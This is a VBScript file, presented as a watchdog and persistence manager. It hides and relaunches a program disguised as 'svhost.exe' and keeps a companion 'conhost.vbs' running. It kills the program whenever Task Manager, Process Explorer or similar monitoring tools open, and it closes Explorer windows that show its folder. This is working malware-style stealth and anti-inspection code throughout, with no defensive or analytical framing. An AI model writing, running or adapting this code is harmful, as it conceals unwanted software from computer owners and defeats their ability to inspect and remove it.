' ==============================================================================
' VBScript Watchdog & Persistence Manager (No Shell Processes)
' ==============================================================================
Option Explicit

Dim fso, wmi, scriptDir, scriptDirNoP, parentDir
Set fso = CreateObject("Scripting.FileSystemObject")

' ==============================================================================
' SAFE WMI GETTER — reconnects if WMI handle goes stale
' ==============================================================================
Function GetWMI()
    On Error Resume Next
    Dim w
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Or w Is Nothing Then
        Err.Clear
        WScript.Sleep 500
        Set w = GetObject("winmgmts:\\.\root\cimv2")
    End If
    On Error GoTo 0
    Set GetWMI = w
End Function

Set wmi = GetWMI()

' ==============================================================================
' SELF-INSTANCE PROTECTION
' ==============================================================================
Dim scriptName, procList, proc, selfCount
scriptName = WScript.ScriptName

Do
    On Error Resume Next
    Set procList = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'wscript.exe' OR Name = 'cscript.exe'")
    If Err.Number = 0 And Not procList Is Nothing Then
        On Error GoTo 0
        Exit Do
    End If
    Err.Clear
    On Error GoTo 0
    WScript.Sleep 2000
Loop

selfCount = 0
For Each proc In procList
    On Error Resume Next
    If Not IsNull(proc.CommandLine) Then
        If InStr(1, proc.CommandLine, scriptName, vbTextCompare) > 0 Then
            selfCount = selfCount + 1
        End If
    End If
    On Error GoTo 0
Next
If selfCount > 1 Then WScript.Quit

' Setup paths
scriptDir    = fso.GetParentFolderName(WScript.ScriptFullName) & "\"
scriptDirNoP = Left(scriptDir, Len(scriptDir) - 1)
parentDir    = fso.GetParentFolderName(scriptDirNoP)

' ==============================================================================
' CONFIGURATION
' ==============================================================================
Const EXE_NAME = "svhost.exe"
Dim appPath, hbFile1, hbFile2
appPath  = scriptDir & EXE_NAME
hbFile1  = scriptDir & "shutdown_hb.tmp"
hbFile2  = scriptDir & "guard_hb.tmp"

If Not fso.FileExists(appPath) Then WScript.Quit

' ==============================================================================
' HELPER: Refresh WMI connection safely
' ==============================================================================
Sub RefreshWMI()
    On Error Resume Next
    Set wmi = Nothing
    WScript.Sleep 200
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Or wmi Is Nothing Then
        Err.Clear
        WScript.Sleep 1000
        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    End If
    On Error GoTo 0
End Sub

' ==============================================================================
' HELPER: Safe WMI query with auto-reconnect on failure
' ==============================================================================
Function SafeQuery(qry)
    On Error Resume Next
    Dim result
    Set result = wmi.ExecQuery(qry)
    If Err.Number <> 0 Or result Is Nothing Then
        Err.Clear
        On Error GoTo 0
        RefreshWMI
        On Error Resume Next
        Set result = wmi.ExecQuery(qry)
        If Err.Number <> 0 Then
            Err.Clear
            Set SafeQuery = Nothing
            On Error GoTo 0
            Exit Function
        End If
    End If
    On Error GoTo 0
    Set SafeQuery = result
End Function

' ==============================================================================
' HELPER: Write heartbeat
' ==============================================================================
Sub WriteHeartbeat(filePath)
    Dim tries, ts
    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set ts = fso.CreateTextFile(filePath, True)
        If Err.Number = 0 Then
            ts.Write Now & vbCrLf
            ts.Close
            On Error GoTo 0
            Exit Sub
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 500
    Loop
End Sub

' ==============================================================================
' HELPER: Count processes by name
' ==============================================================================
Function CountProcessByName(exeName)
    On Error Resume Next
    Dim q, p, n
    n = 0
    Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If q Is Nothing Then
        CountProcessByName = 0
        On Error GoTo 0
        Exit Function
    End If
    For Each p In q
        n = n + 1
    Next
    On Error GoTo 0
    CountProcessByName = n
End Function

' ==============================================================================
' HELPER: Kill all processes by name
' ==============================================================================
Sub KillProcessByName(exeName)
    Dim tries, q, p
    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
        If Not q Is Nothing Then
            For Each p In q
                p.Terminate(0)
            Next
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 1000
    Loop
End Sub

' ==============================================================================
' HELPER: Kill single process by PID
' ==============================================================================
Sub KillProcessByPID(pid)
    Dim tries, q, p
    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set q = SafeQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & pid)
        If Not q Is Nothing Then
            For Each p In q
                p.Terminate(0)
            Next
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 1000
    Loop
End Sub

' ==============================================================================
' HELPER: Launch hidden via WMI with Shell.Application and WScript.Shell fallbacks
' ==============================================================================
Sub LaunchHidden(fullPath, workDir)
    Dim launched, tries
    launched = False
    tries    = 0

    ' --- Primary: WMI ExecMethod with pre-refresh ---
    Do While tries < 3 And Not launched
        On Error Resume Next
        RefreshWMI
        Dim procClass, startupInfo, inParams, outParams
        Set procClass = wmi.Get("Win32_Process")
        If Err.Number <> 0 Then
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 1000
        Else
            Set startupInfo = wmi.Get("Win32_ProcessStartup").SpawnInstance_()
            If Err.Number <> 0 Or startupInfo Is Nothing Then
                Err.Clear
                On Error GoTo 0
                tries = tries + 1
                WScript.Sleep 1000
            Else
                startupInfo.ShowWindow = 0
                Set inParams = procClass.Methods_("Create").InParameters.SpawnInstance_()
                If Err.Number = 0 Then
                    inParams.CommandLine      = fullPath
                    inParams.CurrentDirectory = workDir
                    inParams.ProcessStartupInformation = startupInfo
                    Set outParams = wmi.ExecMethod("Win32_Process", "Create", inParams)
                    If Err.Number = 0 And Not outParams Is Nothing Then
                        If outParams.ReturnValue = 0 Then launched = True
                    End If
                End If
                Err.Clear
                On Error GoTo 0
                tries = tries + 1
                WScript.Sleep 500
            End If
        End If
    Loop

    ' --- Fallback: Shell.Application ShellExecute ---
    If Not launched Then
        tries = 0
        Do While tries < 3 And Not launched
            On Error Resume Next
            Dim shellApp
            Set shellApp = CreateObject("Shell.Application")
            If Err.Number = 0 Then
                shellApp.ShellExecute fullPath, "", workDir, "open", 0
                If Err.Number = 0 Then launched = True
            End If
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 500
        Loop
    End If

    ' --- Last resort: WScript.Shell Run hidden ---
    If Not launched Then
        tries = 0
        Do While tries < 3 And Not launched
            On Error Resume Next
            Dim sh
            Set sh = CreateObject("WScript.Shell")
            If Err.Number = 0 Then
                sh.Run """" & fullPath & """", 0, False
                If Err.Number = 0 Then launched = True
            End If
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 500
        Loop
    End If
End Sub

' ==============================================================================
' HELPER: Launch a vbs file via wscript.exe hidden — retries up to 5 times
' ==============================================================================
Sub LaunchVbs(vbsFile)
    Dim tries, sh
    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set sh = CreateObject("WScript.Shell")
        If Err.Number = 0 Then
            sh.Run "wscript.exe """ & vbsFile & """", 0, False
            If Err.Number = 0 Then
                On Error GoTo 0
                Exit Sub
            End If
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 2000
    Loop
End Sub

' ==============================================================================
' HELPER: Check for visible monitoring tools
' ==============================================================================
Function VisibleMonitorRunning()
    Dim monitorNames, n, c
    monitorNames = Array("Taskmgr.exe", "procexp.exe", "procexp64.exe", _
                         "perfmon.exe", "mmc.exe", "control.exe")
    VisibleMonitorRunning = False
    For Each n In monitorNames
        On Error Resume Next
        c = CountProcessByName(n)
        On Error GoTo 0
        If c > 0 Then
            VisibleMonitorRunning = True
            Exit Function
        End If
    Next
End Function

' ==============================================================================
' HELPER: Enforce single conhost.vbs instance
' ==============================================================================
Sub EnforceConhostVbs()
    Dim tries, q, p, matchList(), matchCount, i, minIdx, vbsPath
    vbsPath    = scriptDir & "conhost.vbs"
    matchCount = 0
    ReDim matchList(0)

    Dim vbsExists
    vbsExists = False
    tries     = 0
    Do While tries < 5
        On Error Resume Next
        vbsExists = fso.FileExists(vbsPath)
        On Error GoTo 0
        If vbsExists Then Exit Do
        tries = tries + 1
        WScript.Sleep 1000
    Loop

    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set q = SafeQuery("SELECT * FROM Win32_Process WHERE Name = 'wscript.exe' OR Name = 'cscript.exe'")
        If Err.Number = 0 And Not q Is Nothing Then
            On Error GoTo 0
            Exit Do
        End If
        Err.Clear
        On Error GoTo 0
        tries = tries + 1
        WScript.Sleep 1000
    Loop
    If q Is Nothing Then Exit Sub

    For Each p In q
        On Error Resume Next
        If Not IsNull(p.CommandLine) Then
            If InStr(1, p.CommandLine, "conhost.vbs", vbTextCompare) > 0 Then
                ReDim Preserve matchList(matchCount)
                matchList(matchCount) = p.ProcessId
                matchCount = matchCount + 1
            End If
        End If
        On Error GoTo 0
    Next

    If matchCount = 0 Then
        If vbsExists Then LaunchVbs vbsPath
    ElseIf matchCount > 1 Then
        minIdx = 0
        For i = 1 To matchCount - 1
            If matchList(i) < matchList(minIdx) Then minIdx = i
        Next
        For i = 0 To matchCount - 1
            If i <> minIdx Then KillProcessByPID matchList(i)
        Next
    End If
End Sub

' ==============================================================================
' HELPER: Close Explorer windows showing parentDir
' ==============================================================================
Sub CloseExplorerWindows()
    Dim tries, shellApp, windows, win, doc, folderPath, targetFolder
    targetFolder = LCase(parentDir)
    If Right(targetFolder, 1) = "\" Then
        targetFolder = Left(targetFolder, Len(targetFolder) - 1)
    End If

    tries = 0
    Do While tries < 5
        On Error Resume Next
        Set shellApp = CreateObject("Shell.Application")
        If Err.Number <> 0 Then
            Err.Clear
            On Error GoTo 0
            tries = tries + 1
            WScript.Sleep 1000
        Else
            Set windows = shellApp.Windows
            If Err.Number <> 0 Then
                Err.Clear
                On Error GoTo 0
                tries = tries + 1
                WScript.Sleep 1000
            Else
                On Error GoTo 0
                For Each win In windows
                    On Error Resume Next
                    Set doc = win.Document
                    If Not doc Is Nothing Then
                        If Not doc.Folder Is Nothing Then
                            folderPath = LCase(doc.Folder.Self.Path)
                            If Right(folderPath, 1) = "\" Then
                                folderPath = Left(folderPath, Len(folderPath) - 1)
                            End If
                            If folderPath = targetFolder Or _
                               Left(folderPath, Len(targetFolder) + 1) = targetFolder & "\" Then
                                win.Quit
                            End If
                        End If
                    End If
                    On Error GoTo 0
                Next
                Exit Do
            End If
        End If
    Loop
End Sub

' ==============================================================================
' MAIN LOOP
' ==============================================================================
Dim loopCount
loopCount = 0

Do
    On Error Resume Next
    loopCount = loopCount + 1
    If loopCount Mod 50 = 0 Then RefreshWMI
    On Error GoTo 0

    WriteHeartbeat hbFile1
    WriteHeartbeat hbFile2
    EnforceConhostVbs
    CloseExplorerWindows

    If VisibleMonitorRunning() Then
        If CountProcessByName(EXE_NAME) > 0 Then
            KillProcessByName EXE_NAME
        End If
    Else
        If CountProcessByName(EXE_NAME) = 0 Then
            LaunchHidden appPath, scriptDirNoP
        End If
    End If

    If Err.Number <> 0 Then
        Err.Clear
        RefreshWMI
    End If

    On Error GoTo 0
    WScript.Sleep 1000
Loop